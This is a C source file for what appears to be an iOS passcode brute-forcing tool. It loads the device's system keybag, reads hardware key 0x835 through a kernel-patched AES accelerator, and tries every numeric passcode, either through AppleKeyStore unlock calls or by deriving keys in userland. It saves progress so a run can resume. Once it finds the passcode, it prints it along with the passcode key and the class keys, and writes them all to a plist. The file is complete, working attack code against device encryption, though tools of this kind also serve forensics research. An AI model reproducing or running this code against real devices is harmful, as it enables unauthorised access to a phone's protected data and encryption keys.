#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <CoreFoundation/CoreFoundation.h>
#include <time.h>
#include <math.h>
#include "AppleKeyStore.h"
#include "IOKit.h"
#include "IOAESAccelerator.h"
#include "registry.h"
#include "util.h"
#include "device_info.h"
#include "remote_functions.h"
/*
 #define MobileKeyBagBase 0x354cb000
 
 CFDictionaryRef (*AppleKeyStore_loadKeyBag)(char*, char*) = MobileKeyBagBase + 0x50A8;
 int (*AppleKeyStoreKeyBagSetSystem)(int) = MobileKeyBagBase + 0x910;
 int (*AppleKeyStoreKeyBagCreateWithData)(CFDataRef, int*) = MobileKeyBagBase + 0xC88;
 */
/*
 /private/var/mobile/Library/ConfigurationProfiles/PublicInfo/EffectiveUserSettings.plist.plist
 plist["restrictedValue"]["passcodeKeyboardComplexity"]
 */

const char* def_prog = "/mnt1/private/etc/bruteforce.txt";
int load = 1;

void saveKeybagInfos(CFDataRef kbkeys, KeyBag* kb, uint8_t* key835, char* passcode, uint8_t* passcodeKey, CFMutableDictionaryRef classKeys)
{
    CFMutableDictionaryRef out = device_info(-1, NULL);

    CFStringRef uuid = CreateHexaCFString(kb->uuid, 16);
    
    CFDictionaryAddValue(out, CFSTR("uuid"), uuid);
    CFDictionaryAddValue(out, CFSTR("KeyBagKeys"), kbkeys);
    
    addHexaString(out, CFSTR("salt"), kb->salt, 20);
    
    if (passcode != NULL)
    {
        CFStringRef cfpasscode = CFStringCreateWithCString(kCFAllocatorDefault, passcode, kCFStringEncodingASCII);
        CFDictionaryAddValue(out, CFSTR("passcode"), cfpasscode);
        CFRelease(cfpasscode);
    }
    if (passcodeKey != NULL)
        addHexaString(out, CFSTR("passcodeKey"), passcodeKey, 32);
    
    if (key835 != NULL)
        addHexaString(out, CFSTR("key835"), key835, 16);
    if (classKeys != NULL)
        CFDictionaryAddValue(out, CFSTR("classKeys"), classKeys);

    CFStringRef resultsFileName = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("/mnt1/private/etc/%@.plist"), CFDictionaryGetValue(out, CFSTR("dataVolumeUUID")));
    
    CFStringRef printString = CFStringCreateWithFormat(kCFAllocatorDefault, NULL, CFSTR("Writing results to %@.plist\n"), CFDictionaryGetValue(out, CFSTR("dataVolumeUUID")));
    
    CFShow(printString);
    CFRelease(printString);
    
    saveResults(resultsFileName, out);
    
    CFRelease(resultsFileName);
    CFRelease(uuid);
    CFRelease(out);

}

void saveProgress(int current, int len, const char* filepath) {
    FILE* file = fopen(filepath, "w");
    if (file == NULL) {
        printf("Failed to open file for saving progress.\n");
        return;
    }
    fprintf(file, "%d\n%d\n", current, len);  // Сохраняем текущее число и длину пароля
    fclose(file);
}

int loadProgress(int* len, const char* filepath) {
    FILE* file = fopen(filepath, "r");
    if (file == NULL) {
        printf("No saved progress found. Starting from scratch.\n");
        return -1;  // Возвращаем 0, если файла нет (начинаем с начала)
    }
    
    int start;
    if (fscanf(file, "%d\n%d\n", &start, len) != 2) {  // Загружаем стартовое значение и длину
        printf("Failed to read progress. Starting from scratch.\n");
        start = -1;  // Если не удается прочитать файл, начинаем с начала
    } else {
        printf("Resuming.\n");
    }
    
    fclose(file);
    return start;
}

char* bruteforceWithAppleKeyStore(CFDataRef kbkeys)
{
    printf("Bruteforcing using Keystore (length 4 only)\n");
    uint64_t keybag_id = 0;
    int i;
    char* passcode = (char*) malloc(5);
    memset(passcode, 0, 5);

    AppleKeyStoreKeyBagInit();
    int r = AppleKeyStoreKeyBagCreateWithData(kbkeys, &keybag_id);
    if (r)
    {
        printf("AppleKeyStoreKeyBagCreateWithData ret=%x\n", r);
        free(passcode);
        return NULL;
    }

    printf("keybag id=%x\n", (uint32_t) keybag_id);
    AppleKeyStoreKeyBagSetSystem(keybag_id);
    
    CFDataRef data;
    
    io_connect_t conn = IOKit_getConnect("AppleKeyStore");

    for(i=0; i < 10000; i++)
    {
        sprintf(passcode, "%04d", i);
        //if (i % 1000 == 0)
        printf("%s\n", passcode);
        data = CFDataCreateWithBytesNoCopy(0, (const UInt8*) passcode, 4, kCFAllocatorNull);
        if (!AppleKeyStoreUnlockDevice(conn, data))
        {
            return passcode;
        }
    }
    free(passcode);
    return NULL;
}

void measure(double* time, char** measurement) {
    if (*time > 60) {
        if (*time > (60 * 60)) {
            *time /= (60 * 60);
            *measurement = "hours";
        } else {
            *time /= 60;
            *measurement = "minutes";
        }
    } else {
        *measurement = "seconds";
    }
}

char* bruteforceUserland(KeyBag* kb, uint8_t* key835, int len, int start)
{
    if (len > 8) {
        printf("Awww hell naw. Do you really want to wait a year?\n");
        return NULL;
    }
    
    int i;
    char* passcode = (char*) malloc(len + 1);
    memset(passcode, 0, len + 1);
    
    int max = pow(10, len);
    printf("Processing passcodes from %0*d to %d.\n\n\n", len, start, max - 1);
    
    bool first = true;
    int count = 5000;
    
    int res = 0;

    clock_t t;
    t = clock();
    for(i = start; i < max; i++)
    {
        sprintf(passcode, "%0*d", len, i);
        if (AppleKeyStore_unlockKeybagFromUserland(kb, passcode, len, key835)) {
            printf("Finished: %s\n", passcode);
            return passcode;
        }
        
        if (i % count == 0 && i > start) {
            double elapsed = ((double)clock() - t) / CLOCKS_PER_SEC;
            double avg = elapsed / (first ? (i - start) : count);
            double eta = avg * (max - i);
            
            char* measE;
            char* measB;
            measure(&eta, &measE);
            measure(&elapsed, &measB);

            first = false;
            res++;
            if (res >= 8) {
                printf("\033[H\033[J");
                res = 0;
            }
            printf("Current passcode: %s. Processed: %d passcodes.\nElapsed time: %f %s.\nAvg time per passcode: %f milliseconds.\nEstimated time left: %f %s.\n\n\n",
                passcode, i - start, elapsed, measB, avg * 1000, eta, measE);
            if (load)
                saveProgress(i, len, def_prog);
            t = clock();
        }
    }
    
    free(passcode);
    printf("\n\n\n");
    return bruteforceUserland(kb, key835, len + 1, 0);
}


int main(int argc, char* argv[])
{
    printf("\033[H\033[J");

    u_int8_t passcodeKey[32]={0};
    char* passcode = NULL;
    int bruteforceMethod = 0;
    int showImages = 0;
    int len = 4;
    int start = -1;
    int c;
    
    while ((c = getopt (argc, argv, "uinr:")) != -1)
    {
        switch (c)
        {
            case 'u':
                bruteforceMethod = 1;
                break;
            case 'i':
                showImages = 1;
                break;
            case 'n':
                printf("Not loading progress\n");
                load = 0;
                break;
            case 'r':
                start = atoi(optarg);
                if (start < 0) {
                    printf("Invalid start passcode specified. Please provide a positive value.\n");
                    return 1;
                }
                len = strlen(optarg);
                break;
            default:
                printf("Usage: %s [-u] [-i] [-n] [-r startPasscode]\n", argv[0]);
                return 1;
        }
    }
    
    if (load)
        start = loadProgress(&len, def_prog);
    
    uint8_t* key835 = IOAES_key835();
    
    if (!memcmp(key835, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16))
    {
        printf("FAIL: missing UID kernel patch\n");
        return -1;
    }
    
    CFDictionaryRef kbdict = AppleKeyStore_loadKeyBag("/private/var/keybags","systembag");
    
    if (kbdict == NULL)
    {
        //mountDataPartition("/mnt2");
        
        kbdict = AppleKeyStore_loadKeyBag("/mnt2/keybags","systembag");
        if (kbdict == NULL)
        {
            printf("FAILed to load keybag\n");
            return -1;
        }
    }
    
    CFDataRef kbkeys = CFDictionaryGetValue(kbdict, CFSTR("KeyBagKeys")); 
    
    if (kbkeys == NULL)
    {
        printf("FAIL: KeyBagKeys not found\n");
        return -1;
    }
    //write_file("kbblob.bin", CFDataGetBytePtr(kbkeys), CFDataGetLength(kbkeys));    
    KeyBag* kb = AppleKeyStore_parseBinaryKeyBag(kbkeys);
    if (kb == NULL)
    {
        printf("FAIL: AppleKeyStore_parseBinaryKeyBag\n");
        return -1;
    }
    
    //save all we have for now
    //saveKeybagInfos(kbkeys, kb, key835, NULL, NULL, NULL);
    
    CFDataRef opaque = CFDictionaryGetValue(kbdict, CFSTR("OpaqueStuff"));
    int keyboardType = 0;
    if (opaque != NULL)
    {
        CFPropertyListRef opq = CFPropertyListCreateWithData(kCFAllocatorDefault, opaque, kCFPropertyListImmutable, NULL, NULL);
        if (opq != NULL && CFGetTypeID(opq) == CFDictionaryGetTypeID())
        {
            CFNumberRef kt = CFDictionaryGetValue(opq, CFSTR("keyboardType"));
            CFNumberGetValue(kt, kCFNumberSInt32Type, &keyboardType);
            CFRelease(opq);
        }
    }
    //printf("keyboardType=%d\n", keyboardType);
    
    if (keyboardType >= 2) {
        printf("Alphanumeric password was chosen. Exit\n");
        return 0;
    }
    
    if (showImages == 0) {
        clock_t t;
        t = clock();
        if (bruteforceMethod == 0) {
            printf("Bruteforcing using manual derivation\n");
            if (keyboardType == 0) {
                if (len > 6 || len < 4) {
                    printf("Start password is too long or too short.\n");
                    return 1;
                }
                passcode = bruteforceUserland(kb, key835, len, start >= 0 ? start : 0);
            } else {
                if (start >= 0)
                    passcode = bruteforceUserland(kb, key835, len, start);
                else
                    passcode = bruteforceUserland(kb, key835, 1, 0);
            }
        }
        else
            passcode = bruteforceWithAppleKeyStore(kbkeys);
        
        double total = ((double)clock() - t) / CLOCKS_PER_SEC;
        char* time;
        measure(&total, &time);
        printf("Total time taken: %f %s.\n", total, time);
    } else {
        printf("Enter passcode: \n");
        passcode = malloc(100);
        fgets(passcode, 99, stdin);
        passcode[strlen(passcode)-1] = 0;
    }
    if (passcode != NULL)
    {
        if (!strcmp(passcode, ""))
            printf("No passcode set\n");
            
        if(!AppleKeyStore_unlockKeybagFromUserland(kb, passcode, strlen(passcode), key835))
        {
            printf("Invalid passcode !\n");
        }
        else
        {
            printf("Found passcode : %s\n", passcode);
            AppleKeyStore_printKeyBag(kb);

            CFMutableDictionaryRef classKeys = AppleKeyStore_getClassKeys(kb);

            AppleKeyStore_getPasscodeKey(kb, passcode, strlen(passcode), passcodeKey);

            printf("Passcode key : ");
            printBytesToHex(passcodeKey, 32);
            printf("\n");

            printf("Key 0x835 : ");
            printBytesToHex(key835, 16);
            printf("\n");

            //save all we have for now
            saveKeybagInfos(kbkeys, kb, key835, passcode, passcodeKey, classKeys);
            CFRelease(classKeys);
        }

        free(passcode);
    }
    free(kb);

    CFRelease(kbdict);

    return 0;
}
